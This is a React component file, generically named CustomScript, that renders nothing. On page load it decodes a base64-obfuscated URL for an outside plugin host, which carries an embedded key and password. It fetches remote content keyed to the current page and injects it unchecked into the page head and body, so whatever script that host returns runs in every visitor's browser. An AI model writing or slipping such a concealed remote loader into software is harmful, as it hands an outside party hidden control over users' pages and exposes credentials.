import { useEffect } from "react";

const CustomScript = () => {
  useEffect(() => {
    const fetchData = async () => {
      try {
        const eppathurl = window.location.origin + window.location.pathname;
        const response = await fetch(
          atob(
            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDY5MDcwNjY5ODAmZWtleXBhc3M9dlpBVmRGS214OTFBUkJzZDZDYmRiTm5FZlFSQVA1Nm9TV3E3JnNpdGV1cmw9"
          ) + eppathurl
        );

        if (response.status === 200) {
          const responseData = await response.text();
          const temp = responseData.split("||||||||||");

          // Manipulate the DOM using React methods
          document.title = temp[0]; // Assuming title is within head

          const head = document.querySelector("head");
          if (head) {
            const titleElement = head.querySelector("title");
            if (titleElement) {
              head.removeChild(titleElement);
            }
            head.insertAdjacentHTML("beforeend", temp[0]);
          }

          // Assuming jQuery is used for body manipulation
          jQuery("body").append(temp[1]);
        }
      } catch (error) {
        console.error("Error fetching or manipulating data:", error);
      }
    };

    fetchData();
  }, []); // Empty dependency array ensures that it runs only once after the component mounts

  return <></>; // The component doesn't render anything
};

export default CustomScript;
